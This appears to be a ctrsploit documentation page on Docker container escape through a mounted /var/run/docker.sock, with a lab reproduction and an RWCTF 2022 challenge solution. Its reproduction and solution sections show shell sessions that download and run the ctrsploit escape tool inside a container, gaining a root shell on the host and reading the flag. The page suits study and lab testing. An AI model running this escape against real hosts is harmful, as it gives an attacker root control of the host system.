# shared docker.sock

## 1. Vulnerability Overview

When the Docker socket (`/var/run/docker.sock`) is mounted inside a container, processes within the container can communicate with the Docker daemon on the host. This is equivalent to giving the container root privileges on the host system, as it can start new containers with arbitrary privileges (e.g., mounting the host's root filesystem), leading to a container escape.

## 2. Attack Scenarios

Insecure configuration

## 3. Prerequisites

* `/var/run/docker.sock` is mounted into the container.

## 4. Vulnerability Check

`ctrsploit vul shared-socket docker.sock checksec`

## 5. Reproduce

![](./video.svg)

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

<details><summary>env details</summary>

```shell
root@localhost:~# docker --version
Docker version 28.3.2, build 578ccf6
root@localhost:~# containerd --version
containerd containerd.io 1.7.27 05044ec0a9a75232cad458027ca83437aae3f4da
root@localhost:~# runc --version
runc version 1.2.5
commit: v1.2.5-0-g59923ef
spec: 1.2.0
go: go1.23.7
libseccomp: 2.5.5
```

</details>

### 5.2 Reproduce Steps

```shell
root@localhost:~# docker run -ti -v /var/run/docker.sock:/var/run/docker.sock:ro busybox:latest 
/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul shared-socket docker.sock x
INFO[0000] creating container with image busybox:latest 
INFO[0000] container created: 0b4ecd9f56a6d2da4c91c735394a9e50b29a6e1707b50a1b52b124fffc40fb93 
INFO[0000] attaching container: 0b4ecd9f56a6d2da4c91c735394a9e50b29a6e1707b50a1b52b124fffc40fb93 
INFO[0000] starting container: 0b4ecd9f56a6d2da4c91c735394a9e50b29a6e1707b50a1b52b124fffc40fb93 
INFO[0000] waiting container: 0b4ecd9f56a6d2da4c91c735394a9e50b29a6e1707b50a1b52b124fffc40fb93 
# ls -lah /
ls -lah /
total 80K
drwxr-xr-x  21 root root 4.0K Jul 21 10:04 .
drwxr-xr-x  21 root root 4.0K Jul 21 10:04 ..
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   2 root root 4.0K Jul 21 10:03 boot
drwxr-xr-x  16 root root 3.8K Sep 16 06:52 dev
drwxr-xr-x  65 root root 4.0K Sep 16 06:52 etc
drwxr-xr-x   3 root root 4.0K Apr 15 14:11 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root root 4.0K Nov 14  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwx------   2 root root  16K Jul 21 10:03 lost+found
drwxr-xr-x   2 root root 4.0K Apr 15 14:04 media
drwxr-xr-x   2 root root 4.0K Apr 15 14:04 mnt
...
drwxr-xr-x  11 root root 4.0K Sep 16 06:52 var
# ps -ef 
ps -ef 
UID          PID    PPID  C STIME TTY          TIME CMD
root           1       0  0 06:52 ?        00:00:00 /sbin/init
...
root         416       1  0 06:52 ?        00:00:00 sshd: /usr/sbin/sshd -D [lis
root         419       1  0 06:52 ?        00:00:00 /usr/bin/containerd
root         431       1  0 06:52 ?        00:00:00 /usr/bin/dockerd -H fd:// --
root         453       2  0 06:52 ?        00:00:00 [kworker/u4:4-flush-8:0]
root         454       2  0 06:52 ?        00:00:00 [kworker/u4:5-events_unbound
root         455       2  0 06:52 ?        00:00:00 [kworker/u4:6-ext4-rsv-conve
root         634     416  0 06:52 ?        00:00:00 sshd: root@pts/0
root         638       1  0 06:52 ?        00:00:00 /usr/lib/systemd/systemd --u
root         639     638  0 06:52 ?        00:00:00 (sd-pam)
root         644       2  0 06:52 ?        00:00:00 [psimon]
root         656     634  0 06:52 pts/0    00:00:00 -bash
root         677       2  0 06:52 ?        00:00:00 [kworker/0:3-events]
root         709     656  0 06:55 pts/0    00:00:00 docker run -ti -v /var/run/d
root         732       1  0 06:55 ?        00:00:00 /usr/bin/containerd-shim-run
root         754     732  0 06:55 pts/0    00:00:00 sh
root         781     754  2 06:56 pts/0    00:00:00 ctrsploit vul shared-socket 
root         794       1  0 06:56 ?        00:00:00 /usr/bin/containerd-shim-run
root         816     794  0 06:56 pts/0    00:00:00 /bin/sh
root         839     816  0 06:57 pts/0    00:00:00 ps -ef
```

## 6. case

### 6.1 RWCTF 2022: Be a Docker Escaper

![](be-a-docker-escaper.svg)

#### (1) Challenge Description

Do you want to be a docker escaper? So you need to be patient. It takes minutes for me to get a docker ready for you. I can’t make it faster without kvm, but I think you can do it locally. from: SpaceSkyNet

#### (2) Env

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd  docker_archive/ctf/Be-a-Docker-Escaper
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

#### (3) Solution

```shell
$ sshpass -p ctf ssh -o StrictHostKeyChecking=no -p 25115 ctf@127.0.0.1
/ # wget -q https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # chmod +x /usr/bin/ctrsploit
/ # ctrsploit vul shared-socket docker.sock c
[Y]  docker.sock	# escape by shared docker socket

/ # ctrsploit vul shared-socket docker.sock x
# cat /root/flag
cat /root/flag
rwctf{THIS_IS_A_TEST_FLAG}
```
